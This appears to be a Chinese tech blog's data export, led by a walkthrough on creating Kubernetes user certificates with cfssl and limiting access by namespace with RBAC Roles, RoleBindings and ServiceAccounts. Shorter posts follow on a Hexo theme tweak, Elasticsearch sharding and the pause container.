cfssl程序，是CFSSL的命令行工具 multirootca程序是可以使用多个签名密钥的证书颁发机构服务器 mkbundle程序用于构建证书池 cfssljson程序，从cfssl和multirootca程序获取JSON输出，并将证书，密钥，CSR和bundle写入磁盘 PKI借助数字证书和公钥加密技术提供可信任的网络身份。通常，证书就是一个包含如下身份信息的文件： 证书所有组织的信息 公钥 证书颁发组织的信息 证书颁发组织授予的权限，如证书有效期、适用的主机名、用途等 使用证书颁发组织私钥创建的数字签名 cfssl工具，子命令介绍： bundle: 创建包含客户端证书的证书包 genkey: 生成一个key(私钥)和CSR(证书签名请求) scan: 扫描主机问题 revoke: 吊销证书 certinfo: 输出给定证书的证书信息，跟cfssl-certinfo 工具作用一样 gencrl: 生成新的证书吊销列表 selfsign: 生成一个新的自签名密钥和签名证书 print-defaults: 打印默认配置，这个默认配置可以用作模板 serve: 启动一个HTTP API服务 gencert: 生成新的key(密钥)和签名证书 -ca：指明ca的证书 -ca-key：指明ca的私钥文件 -config：指明请求证书的json文件 -profile：与-config中的profile对应，是指根据config中的prof ile段来生成证书的相关信息 ocspdump ocspsign info: 获取有关远程签名者的信息 sign: 签名一个客户端证书，通过给定的CA和CA密钥，和主机名 ocsprefresh ocspserve 创建认证中心(CA)，也就是Kubernetes集群的CA，上面用openssl时已经将其省略了，现cfssl操作说明下详细方法： CFSSL可以创建一个获取和操作证书的内部认证中心。运行认证中心需要一个CA证书和相应的CA私钥。任何知道私钥的人都可以充当CA颁发证书。因此，私钥的保护至关重要。 创建用来生成CA文件的JSON配置文件,配置证书生成策略，让CA软件知道颁发什么样的证书。12345678910111213141516171819202122232425[root@linux-node1 ssl]# vim ca-config.json&#123; “signing”: &#123; “default”: &#123; “expiry”: “8760h” &#125;, “profiles”: &#123; “kubernetes”: &#123; “usages”: [ “signing”, “key encipherment”, “server auth”, “client auth” ], “expiry”: “8760h” &#125; &#125; &#125;&#125;这个策略，有一个默认的配置，和一个profile，可以设置多个profile，这里的profile 是kubernetes。默认策略，指定了证书的有效期是一年(8760h)kubernetes策略，指定了证书的用途signing, 表示该证书可用于签名其它证书；生成的ca.pem 证书中 CA=TRUEserver auth：表示client可以用该CA对server提供的证书进行验证client auth：表示server可以用该CA对client提供的证书进行验证 创建用来生成CA证书签名请求（CSR）的JSON配置文件123456789101112131415161718192021222324[root@linux-node1 ssl]# vim ca-csr.json&#123; “CN”: “kubernetes”, “key”: &#123; “algo”: “rsa”, “size”: 2048 &#125;, “names”: [ &#123; “C”: “CN”, “ST”: “BeiJing”, “L”: “BeiJing”, “O”: “k8s”, “OU”: “System” &#125; ]&#125;术语介绍:CN: Common Name，浏览器使用该字段验证网站是否合法，一般写的是域名。非常重要。浏览器使用该字段验证网站是否合法C: Country， 国家L: Locality，地区，城市O: Organization Name，组织名称，公司名称OU: Organization Unit Name，组织单位名称，公司部门ST: State，州，省 生成CA证书（ca.pem）和私钥（ca-key.pem）123456789[root@ linux-node1 ssl]# cfssl gencert -initca ca-csr.json | cfssljson -bare ca #初始化ca[root@ linux-node1 ssl]# ls -l ca*-rw-r–r– 1 root root 290 Mar 4 13:45 ca-config.json-rw-r–r– 1 root root 1001 Mar 4 14:09 ca.csr-rw-r–r– 1 root root 208 Mar 4 13:51 ca-csr.json-rw——- 1 root root 1679 Mar 4 14:09 ca-key.pem-rw-r–r– 1 root root 1359 Mar 4 14:09 ca.pem该命令会生成运行CA所必需的文件ca-key.pem（私钥）和ca.pem（证书），还会生成ca.csr（证书签名请求），用于交叉签名或重新签名。 小提示： 使用现有的CA私钥，重新生成：1cfssl gencert -initca -ca-key key.pem ca-csr.json | cfssljson -bare ca 使用现有的CA私钥和CA证书，重新生成：1cfssl gencert -renewca -ca cert.pem -ca-key key.pem 查看cert(证书信息)：cfssl certinfo -cert ca.pem 查看CSR(证书签名请求)信息：cfssl certinfo -csr ca.csr 创建martin证书签名请求(Kubernetes集群的CA创建好了，再根据该CA证书来创建一个只能访问某个namespace的用户)12345678910111213141516171819202122➜ martin cat martin-csr.json &#123; “CN”: “martin”, “hosts”: [], “key”: &#123; “algo”: “rsa”, “size”: 2048 &#125;, “names”: [ &#123; “C”: “CN”, “ST”: “BeiJing”, “L”: “BeiJing”, “O”: “op”, #system:masters “OU”: “System” &#125; ]&#125;➜ martin 后续kube-apiserver使用RBAC对客户端(如kubelet、kube-proxy、Pod)请求进行授权；kube-apiserver预定义了一些RBAC使用的RoleBindings，如cluster-admin将Group op(system:masters)与 Role cluster-admin 绑定，该Role授予了调用kube-apiserver的所有API的权限；OU指定该证书的Group为op(system:masters)，kubelet使用该证书访问 kube-apiserver时,由于证书被CA签名，所以认证通过，同时由于证书用户组为经过预授权的op(system:masters)，所以被授予访问所有 API 的权限； 生成martin证书和私钥1234567891011121314151617181920➜ martin ls -lthtotal 4.0K-rw-r–r– 1 root root 218 Jun 26 11:59 martin-csr.json➜ martin cfssl gencert -ca=/data/kubernetes/ssl/ca.pem -ca-key=/data/kubernetes/ssl/ca-key.pem -config=/data/kubernetes/ssl/ca-config.json -profile=kubernetes martin-csr.json|cfssljson -bare martin2018/06/26 16:20:37 [INFO] generate received request2018/06/26 16:20:37 [INFO] received CSR2018/06/26 16:20:37 [INFO] generating key: rsa-20482018/06/26 16:20:38 [INFO] encoded CSR2018/06/26 16:20:38 [INFO] signed certificate with serial number 4515304189457537416988994027390824160749108294022018/06/26 16:20:38 [WARNING] This certificate lacks a “hosts” field. This makes it unsuitable forwebsites. For more information see the Baseline Requirements for the Issuance and Managementof Publicly-Trusted Certificates, v.1.1.6, from the CA/Browser Forum (https://cabforum.org);specifically, section 10.2.3 (“Information Requirements”).➜ martin ls -lthtotal 16K-rw-r–r– 1 root root 993 Jun 26 16:20 martin.csr-rw——- 1 root root 1.7K Jun 26 16:20 martin-key.pem-rw-r–r– 1 root root 1.4K Jun 26 16:20 martin.pem-rw-r–r– 1 root root 218 Jun 26 11:59 martin-csr.json➜ martin 设置集群参数 本段主要设置了需要访问的集群的信息。使用set-cluster设置了需要访问的集群，如下为kubernetes，这只是个名称，实际为–server指向的apiserver；–certificate-authority设置了该集群的公钥；–embed-certs为true表示将–certificate-authority证书写入到kubeconfig中；–server则表示该集群的kube-apiserver地址 1234567891011121314151617181920212223➜ martin kubectl config set-cluster kubernetes –certificate-authority=/data/kubernetes/ssl/ca.pem –embed-certs=true –server=https://192.168.0.14:6443 –kubeconfig=martin.kubeconfigCluster “kubernetes” set.➜ martin ls -lthtotal 20K-rw——- 1 root root 2.0K Jun 26 16:29 martin.kubeconfig-rw-r–r– 1 root root 993 Jun 26 16:20 martin.csr-rw——- 1 root root 1.7K Jun 26 16:20 martin-key.pem-rw-r–r– 1 root root 1.4K Jun 26 16:20 martin.pem-rw-r–r– 1 root root 218 Jun 26 11:59 martin-csr.json生成了新的文件：martin.kubeconfig➜ martin cat martin.kubeconfig apiVersion: v1clusters:- cluster: certificate-authority-data: xxx server: https://192.168.0.14:6443 name: kubernetescontexts: []current-context: “”kind: Configpreferences: &#123;&#125;users: []➜ martin 注意：–kubeconfig=martin.kubeconfig是将生成的相关信息全部写入martin.kubeconfig文件,如果不指定的话，默认是写入到“~/.kube/config ” 设置客户端认证参数 本段主要设置用户的相关信息，主要是用户证书。如下用户名为martin，证书为：/martin.pem，私钥为：./martin-key.pem。客户端的证书首先要经过集群CA的签署，否则不会被集群认可。此处使用的是ca认证方式，也可以使用token认证，如kubelet的TLS Boostrap机制下的bootstrapping使用的就是token认证方式。如下kubectl使用的是ca认证，不需要token字段 12345678➜ martin kubectl config set-credentials martin –client-certificate=./martin.pem –client-key=./martin-key.pem –embed-certs=true –kubeconfig=martin.kubeconfig User “martin” set.➜ martin 可以看到martin.kubeconfig新增了如下内容：users:- name: martin user: xxx 设置上下文参数,指定命名空间为：kube-system 集群参数和用户参数可以同时设置多对，在上下文参数中将集群参数和用户参数关联起来。下面的上下文名称为martin-context，集群为kubenetes，用户为martin，表示使用martin的用户凭证来访问kubenetes集群的kube-system命名空间(增加–namspace来指定访问的命名空间)。 执行之前先看下:martin.kubeconfig文件内容： 1234567891011121314151617➜ martin cat martin.kubeconfig apiVersion: v1clusters:- cluster: certificate-authority-data: xxx server: https://192.168.0.14:6443 name: kubernetescontexts: []current-context: “”kind: Configpreferences: &#123;&#125;users:- name: martin user: client-certificate-data: xxx client-key-data: xxx➜ martin 执行： 123➜ martin kubectl config set-context martin-context –cluster=kubernetes –namespace=kube-system –user=martin –kubeconfig=martin.kubeconfig Context “martin-context” created.➜ martin 再次查看martin.kubeconfig文件,发现内容做了如下改变：之前： 1contexts: [] 现在： 123456contexts:- context: cluster: kubernetes namespace: kube-system user: martin name: martin-context 增加了上下文的相关信息。 设置默认上下文12➜ martin kubectl config use-context martin-context –kubeconfig=martin.kubeconfigSwitched to context “martin-context”. 如果配置了多个环境项，可以通过切换不同的环境项名字或指定kubeconfig文件来访问到不同的集群环境。 现在martin用户通过cfssl创建成功,可以看到所有关于martin用户的信息都写入了配置文件：martin.kubeconfig,不指定”-kubeconfig=”的话，默认是写入到”~/.kube/config”，如果之前有admin的相关信息，会追加到后面。martin.kubeconfig配置文件描述了集群、用户和上下文 kubectl只是个go编写的可执行程序，只要为kubectl配置合适的kubeconfig，就可以在集群中的任意节点使用。kubectl默认会从$HOME/.kube目录下查找文件名为config的文件，也可以通过设置环境变量KUBECONFIG或者通过设置–kubeconfig去指定其它kubeconfig文件,总之kubeconfig就是为访问集群所作的配置。 如果之前”~/.kube/config”下配置的是admin账号信息，要用martin账号，则指定kubeconfig文件即可： 12345678➜ martin kubectl config get-contexts CURRENT NAME CLUSTER AUTHINFO NAMESPACE kubernetes kubernetes admin ➜ martin ➜ martin kubectl config get-contexts –kubeconfig martin.kubeconfigCURRENT NAME CLUSTER AUTHINFO NAMESPACE martin-context kubernetes martin kube-system➜ martin 现在使用当前的这个配置文件来操作kubectl命令的时候，应该会出现错误，因为还没有为该用户定义任何操作的权限呢： 123➜ martin kubectl get pods –kubeconfig martin.kubeconfigError from server (Forbidden): pods is forbidden: User “martin” cannot list pods in the namespace “default”➜ martin 如果提示：“kubectl error: You must be logged in to the server (Unauthorized)”则是没有指定martin.kubeconfig文件或者默认的”~/.kube/config”里面没有martin用户的相关证书信息，因为前面设置客户端认证的时候没有指定password，而是用了证书。 1234kubectl config set-credentials kubeuser/foo.kubernetes.com –username=kubeuser –password=kubepassword (用户名密码认证方式)kubectl config set-credentials martin –client-certificate=./martin.pem –client-key=./martin-key.pem –embed-certs=true –kubeconfig=martin.kubeconfig(证书认证方式) 另外可以通过：”Cfssl-Certinfo“命令来查看martin证书信息 12345678910111213141516171819202122232425262728293031323334➜ martin cfssl-certinfo -cert martin.pem&#123; “subject”: &#123; “common_name”: “martin”, “country”: “CN”, “organization”: “op”, “organizational_unit”: “System”, “locality”: “BeiJing”, “province”: “BeiJing”, “names”: [ “CN”, “BeiJing”, “BeiJing”, “op”, “System”, “martin” ] &#125;, “issuer”: &#123; “common_name”: “kubernetes”, “country”: “CN”, “organization”: “k8s”, “organizational_unit”: “System”, “locality”: “BeiJing”, “province”: “BeiJing”, “names”: [ “CN”, “BeiJing”, “BeiJing”, “k8s”, “System”, “kubernetes” ] &#125;, 第二步：创建角色用户创建完成后，接下来就需要给该用户添加操作权限，定义一个YAML文件，创建一个允许用户操作Deployment、Pod、ReplicaSets 的角色，如下定义：(martin-role.yaml) 1234567891011➜ martin cat martin-role.yaml apiVersion: rbac.authorization.k8s.io/v1kind: Rolemetadata: name: martin-role namespace: kube-systemrules:- apiGroups: [“”, “extensions”, “apps”] resources: [“deployments”, “replicasets”, “pods”] verbs: [“get”, “list”, “watch”, “create”, “update”, “patch”, “delete”] # 也可以使用[‘*’]➜ martin 其中Pod属于core这个API Group，在YAML中用空字符就可以，而Deployment属于apps 这个API Group，ReplicaSets属于extensions这个API Group(点这里查文档)，所以 rules下面的apiGroups 就综合了这几个资源的 API Group：[“”, “extensions”, “apps”]，其中verbs就是上面提到的可以对这些资源对象执行的操作，这里需要所有的操作方法，所以也可以使用[‘*’]来代替。 然后创建这个Role: 123➜ martin kubectl create -f martin-role.yaml role.rbac.authorization.k8s.io “martin-role” created➜ martin 注意这里没有使用上面的martin-context这个上下文，因为木有权限 第三步：创建角色权限绑定Role创建完成了，但是很明显现在这个Role和我们的用户martin 还没有任何关系，这里就需要创建一个RoleBinding对象，在 kube-system这个命名空间下面将上面的martin-role角色和用户 martin进行绑定:(martin-rolebinding.yaml) 123456789101112131415161718➜ martin cat martin-rolebinding.yaml apiVersion: rbac.authorization.k8s.io/v1kind: RoleBindingmetadata: name: martin-rolebinding namespace: kube-systemroleRef: #apiGroup: rbac.authorization.k8s.io #kind: ClusterRole kind: Role name: martin-role apiGroup: “”subjects:- apiGroup: “” kind: User name: martin #apiGroup: “” #会提示语法错误➜ martin 上面的YAML文件中看到了subjects关键字，这里就是上面提到的用来尝试操作集群的对象，这里对应上面的 User帐号martin，使用kubectl创建上面的资源对象： 12➜ martin kubectl create -f martin-rolebinding.yamlrolebinding.rbac.authorization.k8s.io “martin-rolebinding” created 使用admin账号(martin账号无权限查看)查看role和rolebinding相关信息： 12345678910111213141516171819202122232425➜ martin kubectl get rolebinding –all-namespacesNAMESPACE NAME AGEkube-public system:controller:bootstrap-signer 19dkube-system kubernetes-dashboard-minimal 11dkube-system martin-rolebinding 18hkube-system system::leader-locking-kube-controller-manager 19dkube-system system::leader-locking-kube-scheduler 19dkube-system system:controller:bootstrap-signer 19dkube-system system:controller:cloud-provider 19dkube-system system:controller:token-cleaner 19dkube-system ui-admin-binding 11dkube-system ui-read-binding 11d➜ martin ➜ martin kubectl get role –all-namespaces NAMESPACE NAME AGEkube-public system:controller:bootstrap-signer 19dkube-system extension-apiserver-authentication-reader 19dkube-system kubernetes-dashboard-minimal 11dkube-system martin-role 18hkube-system system::leader-locking-kube-controller-manager 19dkube-system system::leader-locking-kube-scheduler 19dkube-system system:controller:bootstrap-signer 19dkube-system system:controller:cloud-provider 19dkube-system system:controller:token-cleaner 19d➜ martin 第四步：测试现在应该可以用上面的martin-context上下文来操作集群了： 123456789101112131415161718➜ martin kubectl get pods NAME READY STATUS RESTARTS AGEnexus3-68f55d9746-vfnf8 1/1 Running 0 5drbd-rest-api-registrykey-m262-1 1/1 Running 0 4d➜ martin ➜ martin kubectl get pods -n defaultNAME READY STATUS RESTARTS AGEnexus3-68f55d9746-vfnf8 1/1 Running 0 5drbd-rest-api-registrykey-m262-1 1/1 Running 0 4d➜ martin ➜ martin kubectl get pods –kubeconfig martin.kubeconfigNAME READY STATUS RESTARTS AGEcoredns-77c989547b-lcbfw 1/1 Running 1 15dcoredns-77c989547b-xq4dr 1/1 Running 1 15dheapster-77b9c5bd7b-l5ms6 1/1 Running 0 11dkubernetes-dashboard-66c9d98865-g8l6l 1/1 Running 0 11dmonitoring-grafana-7c674cb7f6-nqvlw 1/1 Running 0 11dmonitoring-influxdb-644db5c5b6-llnp9 1/1 Running 0 11d 使用kubectl时并没有指定namespace，这是因为之前已经为该用户分配了权限，并且指定了kube-system命名空间写入到martin.kubeconfig文件中，如果使用default命名空间，在后面加上一个-n default，则会提示forbidden,如下： 123➜ martin kubectl get pods -n default –kubeconfig martin.kubeconfig Error from server (Forbidden): pods is forbidden: User “martin” cannot list pods in the namespace “default”➜ martin 这是因为该用户并没有default这个命名空间的操作权限。 创建一个只能访问某个namespace的ServiceAccount上面创建了一个只能访问某个命名空间下面的普通用户，前面也提到过subjects,下面还有一种类型的主题资源：ServiceAccount。 第一步：创建一个集群内部的用户只能操作kube-system这个命名空间下面的pods和deployments首先来创建一个ServiceAccount对象： 123456789101112131415➜ serviceaccount kubectl create sa martin-sa -n kube-systemserviceaccount “martin-sa” created➜ serviceaccount ➜ serviceaccount kubectl get sa NAME SECRETS AGEdefault 1 20d➜ serviceaccount kubectl get sa -n kube-systemNAME SECRETS AGEadmin-user 1 11dcoredns 1 15ddefault 1 20dheapster 1 11dkubernetes-dashboard 1 11dmartin-sa 1 13s➜ serviceaccount 当然也可以定义成YAML文件的形式来创建: 12345apiVersion: v1kind: ServiceAccountmetadata: name: martin-sa namespace: kube-system 第二步：创建一个Role对象：(martin-sa-role.yaml)1234567891011121314➜ serviceaccount cat martin-sa-role.yaml apiVersion: rbac.authorization.k8s.io/v1kind: Rolemetadata: name: martin-sa-role namespace: kube-systemrules:- apiGroups: [“”] resources: [“pods”] verbs: [“get”, “list”, “watch”] # 也可以使用[‘*’]- apiGroups: [“apps”] resources: [“deployments”] verbs: [“get”, “list”, “watch”, “create”, “update”, “patch”, “delete”]➜ serviceaccount 可以看到这里定义的角色没有创建、删除、更新Pod的权限，等会可以重点测试一下。 创建该Role对象： 12➜ serviceaccount kubectl create -f martin-sa-role.yaml role.rbac.authorization.k8s.io “martin-sa-role” created 第三步，创建一个RoleBinding对象，将上面的martin-sa和角色martin-sa-role进行绑定：(martin-sa-rolebinding.yaml)1234567891011121314➜ serviceaccount cat martin-sa-rolebinding.yaml apiVersion: rbac.authorization.k8s.io/v1kind: RoleBindingmetadata: name: martin-sa-rolebinding namespace: kube-systemsubjects:- kind: ServiceAccount name: martin-sa namespace: kube-systemroleRef: kind: Role name: martin-sa-role apiGroup: rbac.authorization.k8s.io 创建这个资源对象： 1234567891011121314151617➜ serviceaccount kubectl get rolebinding -n kube-systemNAME AGEkubernetes-dashboard-minimal 11dmartin-rolebinding 22h➜ serviceaccount ➜ serviceaccount kubectl create -f martin-sa-rolebinding.yaml rolebinding.rbac.authorization.k8s.io “martin-sa-rolebinding” created➜ serviceaccount ➜ serviceaccount kubectl get rolebinding No resources found.➜ serviceaccount kubectl get rolebinding -n kube-systemNAME AGEkubernetes-dashboard-minimal 11dmartin-rolebinding 23hmartin-sa-rolebinding 26s可以看到martin-sa-rolebinding已经添加 第四步，验证这个ServiceAccount一个ServiceAccount会生成一个Secret对象和它进行映射，这个Secret里面包含一个token： 1234567891011121314151617181920212223242526➜ serviceaccount kubectl get secret -n kube-systemNAME TYPE DATA AGEadmin-user-token-xszp7 kubernetes.io/service-account-token 3 11dcoredns-token-9ppnq kubernetes.io/service-account-token 3 15ddefault-token-fs7zj kubernetes.io/service-account-token 3 20dheapster-token-gn8g5 kubernetes.io/service-account-token 3 11dkubernetes-dashboard-certs Opaque 0 11dkubernetes-dashboard-key-holder Opaque 2 15dkubernetes-dashboard-token-tg782 kubernetes.io/service-account-token 3 11dmartin-sa-token-78s5j kubernetes.io/service-account-token 3 41m #新增➜ serviceaccount ➜ serviceaccount kubectl describe secret martin-sa-token-78s5j -n kube-systemName: martin-sa-token-78s5jNamespace: kube-systemLabels: &lt;none&gt;Annotations: kubernetes.io/service-account.name=martin-sa kubernetes.io/service-account.uid=576ef41d-79e2-11e8-bede-5254004f2222Type: kubernetes.io/service-account-tokenData====ca.crt: 1359 bytesnamespace: 11 bytestoken: xxx➜ serviceaccount ==注意：查看时需要-n指定kube-system命名空间！== 然后可以利用这个token去登录Dashboard，就可以在Dashboard中来验证功能是否符合预期： 123➜ serviceaccount kubectl get secret martin-sa-token-78s5j -o jsonpath=&#123;.data.token&#125; -n kube-system |base64 -d #会生成一串很长的base64后的字符串xxxxxxxxxxxxxxxx➜ serviceaccount 使用这里的xxx token去Dashboard页面进行登录：会出现如下提示信息： 1234configmaps is forbidden: User “system:serviceaccount:kube-system:martin-sa” cannot list configmaps in the namespace “default”closewarningpersistentvolumeclaims is forbidden: User “system:serviceaccount:kube-system:martin-sa” cannot list persistentvolumeclaims in the namespace “default” 这是因为登录进来后默认跳转到default命名空间，但是却没有改空间的权限，因此需要切换到kube-system命名空间下面: 原来url:https://xxx/#!/deployment?namespace=default 修改为新url:https://xxx/#!/deployment?namespace=kube-system 可以看到能访问pod列表了，但是也会有一些其他额外的提示：events is forbidden: User “system:serviceaccount:kube-system:martin-sa” cannot list events in the namespace “kube-system”，这是因为当前登录用只被授权了访问pod和deployment的权限，同样的，访问下deployment看看可以了吗？ 同样的，可以根据自己的需求来对访问用户的权限进行限制，可以自己通过Role定义更加细粒度的权限，也可以使用系统内置的一些权限…… 创建一个可以访问所有 namespace 的ServiceAccount刚刚创建的martin-sa这个ServiceAccount和一个Role角色进行绑定的，如果现在创建一个新的ServiceAccount，需要他操作的权限作用于所有的namespace，这个时候就需要使用到ClusterRole 和 ClusterRoleBinding 这两种资源对象了。 第一步，同样，首先新建一个ServiceAcount对象：(martin-sa2.yaml)12345678910111213141516171819202122➜ serviceaccount cat martin-sa2.yaml apiVersion: v1kind: ServiceAccountmetadata: name: martin-sa2 namespace: kube-system➜ serviceaccount ➜ serviceaccount kubectl create -f martin-sa2.yaml serviceaccount “martin-sa2” created➜ serviceaccount kubectl get sa NAME SECRETS AGEdefault 1 20d➜ serviceaccount kubectl get sa -n kube-systemNAME SECRETS AGEadmin-user 1 12dcoredns 1 15ddefault 1 20dheapster 1 12dkubernetes-dashboard 1 12dmartin-sa 1 1hmartin-sa2 1 12s➜ serviceaccount 第二步，创建一个ClusterRoleBinding 对象(martin-clusterolebinding.yaml):1234567891011121314➜ serviceaccount cat martin-clusterolebinding.yaml apiVersion: rbac.authorization.k8s.io/v1beta1kind: ClusterRoleBindingmetadata: name: martin-sa2-clusterrolebindingsubjects:- kind: ServiceAccount name: martin-sa2 namespace: kube-systemroleRef: kind: ClusterRole name: cluster-admin apiGroup: rbac.authorization.k8s.io➜ serviceaccount 对比下之前的”martin-sa-rolebinding.yaml” 123456789101112131415➜ serviceaccount cat martin-sa-rolebinding.yaml apiVersion: rbac.authorization.k8s.io/v1kind: RoleBindingmetadata: name: martin-sa-rolebinding namespace: kube-systemsubjects:- kind: ServiceAccount name: martin-sa namespace: kube-systemroleRef: kind: Role name: martin-sa-role apiGroup: rbac.authorization.k8s.io➜ serviceaccount 从上面可以看到没有为这个资源对象声明namespace，因为这是一个ClusterRoleBinding 资源对象，是作用于整个集群的，也没有单独新建一个ClusterRole对象，而是使用的 cluster-admin这个对象，这是Kubernetes集群内置的ClusterRole对象，可以使用kubectl get clusterrole 和kubectl get clusterrolebinding查看系统内置的一些集群角色和集群角色绑定，这里使用的 cluster-admin这个集群角色是拥有最高权限的集群角色，所以一般需要谨慎使用该集群角色。 创建上面集群角色绑定资源对象： 123➜ serviceaccount kubectl create -f martin-clusterolebinding.yaml clusterrolebinding.rbac.authorization.k8s.io “martin-sa2-clusterrolebinding” created➜ serviceaccount 通过ubectl get clusterrolebinding可以看到”martin-sa2-clusterrolebinding”已经加入其中： 1234567➜ serviceaccount kubectl get clusterrolebinding NAME AGEadmin-user 12dcluster-admin 20dheapster 12dkubelet-bootstrap 19dmartin-sa2-clusterrolebinding 22s 第三步，使用 ServiceAccount对应的token去登录Dashboard验证：1234567➜ serviceaccount kubectl get secret -n kube-system|grep martin-sa2-token-q7bhrmartin-sa2-token-q7bhr kubernetes.io/service-account-token 3 34m➜ serviceaccount ➜ serviceaccount kubectl get secret martin-sa2-token-q7bhr -o jsonpath=&#123;.data.token&#125; -n kube-system |base64 -dxxxxxxx#会生成一串很长的base64后的字符串➜ serviceaccount 在最开始接触到RBAC认证的时候，可能不太熟悉，特别是不知道应该怎么去编写rules规则，可以去分析系统自带的clusterrole、clusterrolebinding这些资源对象的编写方法，利用 kubectl的get、describe、-o yaml这些操作，所以kubectl最基本的操作一定要掌握好。 RBAC只是Kubernetes中安全认证的一种方式，当然也是现在最重要的一种方式。","categories":[],"tags":[{"name":"K8s","slug":"K8s","permalink":"http://chucz.club/tags/K8s/"}]},{"title":"只在移动端网页内显示”Fork me on Github”","slug":"只在移动端网页内显示”Fork-me-on-Github”","date":"2018-08-19T01:48:41.000Z","updated":"2018-09-28T08:25:28.616Z","comments":true,"path":"2018/08/19/只在移动端网页内显示”Fork-me-on-Github”/","link":"","permalink":"http://chucz.club/2018/08/19/只在移动端网页内显示”Fork-me-on-Github”/","excerpt":"","text":"1.修改文件hexo博客根目录\\themes\\next\\layout_layout.swig 找到如下代码块1234&lt;html class=“&#123;&#123; html_class | lower &#125;&#125;“ lang=“&#123;&#123; config.language &#125;&#125;“&gt;&lt;head&gt; &#123;% include ‘_partials/head.swig’ %&#125; &lt;title&gt;&#123;% block title %&#125;&#123;% endblock %&#125;&lt;/title&gt; 2.添加代码，结果如下：1234567891011121314151617&lt;html class=“&#123;&#123; html_class | lower &#125;&#125;“ lang=“&#123;&#123; config.language &#125;&#125;“&gt;&lt;head&gt; &#123;% include ‘_partials/head.swig’ %&#125; &lt;title&gt;&#123;% block title %&#125;&#123;% endblock %&#125;&lt;/title&gt; &#123;% include ‘_third-party/analytics/index.swig’ %&#125; &lt;style&gt; .forkMeOnGithub&#123; display: none; &#125; @media (min-width: 768px) &#123; .forkMeOnGithub&#123; display: inline; &#125; &#125; &lt;/style&gt;&lt;/head&gt; 3.最后在之前引用代码块上套上div加上class就行了，代码如下123&lt;div class=“forkMeOnGithub”&gt;&lt;a href=“https://github.com/hannius&quot;&gt;&lt;img style=“position……..&lt;/a&gt;&lt;/div&gt;","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://chucz.club/tags/hexo/"}]},{"title":"Elasticsearch分片及集群说明","slug":"Elasticsearch分片及集群说明","date":"2018-08-16T23:56:33.000Z","updated":"2018-09-28T08:25:28.616Z","comments":true,"path":"2018/08/16/Elasticsearch分片及集群说明/","link":"","permalink":"http://chucz.club/2018/08/16/Elasticsearch分片及集群说明/","excerpt":"","text":"replica的作用主要包括： a.容灾:primary分片丢失，replica分片就会被顶上去成为新的主分片，同时根据这个新的主分片创建新的replica,集群数据安然无恙； b.提高查询性能：replica和primary分片的数据是相同的，所以对于一个query既可以查主分片也可以查备分片，在合适的范围内多个replica性能会更优(但要考虑资源占用也会提升[cpu/disk/heap])，另外index request只能发生在主分片上，replica不能执行index request; 分片数目调整：对于一个索引，除非重建索引否则不能调整分片的数目(主分片数，number_of_shards),但可以随时调整replica数(number_of_replicas) ES集群状态有三种： Green: 所有主分片和备份分片都准备就绪(分配成功)，即使有一台机器挂了(假设一台机器一个实例)，数据都不会丢失，但会变成YELLOW状态； Yellow: 所有主分片准备就绪，但存在至少一个主分片(假设是A)对应的备份分片没有就绪，此时集群属于告警状态，意味着集群高可用和容灾能力下降，如果刚好A所在的机器挂了，并且你只设置了一个备份(已处于未就绪状态),那么A的数据就会丢失(查询结果不完整)，此时集群进入Red状态； Red: 至少有一个主分片没有就绪(直接原因是找不到对应的备份分片成为新的主分片),此时查询的结果会出现数据丢失(不完整) Elasticsearch与关系数据的类比对应关系如下：Relational DB ⇒ Databases ⇒ Tables ⇒ Rows ⇒ ColumnsElasticsearch ⇒ Indices ⇒ Types ⇒ Documents ⇒ Fields 这里的document的可以理解为一个JSON序列对象。每个document可包含多个field。再来说说Shard，每个Index（对应Database）包含多个Shard，默认是5个，分散在不同的Node上，但不会存在两个相同的Shard存在一个Node上，这样就没有备份的意义了。Shard是一个最小的Lucene索引单元。当来一个document的时候，Elasticsearch通过对docid进行hash来确定其放在哪个shard上面，然后在shard上面进行索引存储。replicas就是备份，Elasticsearch采用的是Push Replication模式，当你往 master主分片上面索引一个文档，该分片会复制该文档(document)到剩下的所有 replica副本分片中，这些分片也会索引这个文档。 当进行查询时，如果提供了查询的DocID，Elasticsearch通过hash就知道Doc存在哪个shard上面，再通过routing table查询就知道再哪个node上面，让后去node上面去取就好了。如果不提供DocID,那么Elasticsearch会在该Index（indics）shards所在的所有node上执行搜索预警，然后返回搜索结果，由coordinating node gather之后返回给用户。 集群信息说明图如下：","categories":[],"tags":[{"name":"ELK","slug":"ELK","permalink":"http://chucz.club/tags/ELK/"}]},{"title":"Pause容器","slug":"Pause容器","date":"2018-08-16T23:55:14.000Z","updated":"2018-09-28T08:25:28.616Z","comments":true,"path":"2018/08/16/Pause容器/","link":"","permalink":"http://chucz.club/2018/08/16/Pause容器/","excerpt":"","text":"Pause容器定义Pause容器，又叫Infra容器，本文将探究该容器的作用与原理。 在kubelet的配置中有这样一个参数： 1KUBELET_POD_INFRA_CONTAINER=–pod-infra-container-image=registry.access.redhat.com/rhel7/pod-infrastructure:latest 上面是openshift中的配置参数，kubernetes中默认的配置参数是： 1KUBELET_POD_INFRA_CONTAINER=–pod-infra-container-image=gcr.io/google_containers/pause-amd64:3.0 Pause容器，是可以自己来定义，官方使用的gcr.io/google_containers/pause-amd64:3.0容器的代码见Github，使用C语言编写。 Pause容器的作用检查nod节点的时候会发现每个node上都运行了很多的pause容器，例如如下: 12345678[root@elk-02 bin]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES576c56bd6065 mirrorgooglecontainers/kubernetes-dashboard-amd64 “/dashboard –inse…” 2 hours ago Up 2 hours k8s_kubernetes-dashboard_kubernetes-dashboard-66c9d98865-jdbg8_kube-system_d2406f4f-6de3-11e8-8760-5254004f2222_0c4985381c2b7 d4b7466213fe “/coredns -conf /e…” 2 hours ago Up 2 hours k8s_coredns_coredns-77c989547b-xq4dr_kube-system_d23ef2c4-6de3-11e8-8760-5254004f2222_1ba2fef1cbf00 mirrorgooglecontainers/pause-amd64:3.0 “/pause” 2 hours ago Up 2 hours k8s_POD_coredns-77c989547b-xq4dr_kube-system_d23ef2c4-6de3-11e8-8760-5254004f2222_1ea6c2994b397 d4b7466213fe “/coredns -conf /e…” 2 hours ago Up 2 hours k8s_coredns_coredns-77c989547b-lcbfw_kube-system_0696926b-6d79-11e8-8760-5254004f2222_1f61476c51230 mirrorgooglecontainers/pause-amd64:3.0 “/pause” 2 hours ago Up 2 hours k8s_POD_kubernetes-dashboard-66c9d98865-jdbg8_kube-system_d2406f4f-6de3-11e8-8760-5254004f2222_0b6f61200d5ea mirrorgooglecontainers/pause-amd64:3.0 “/pause” 2 hours ago 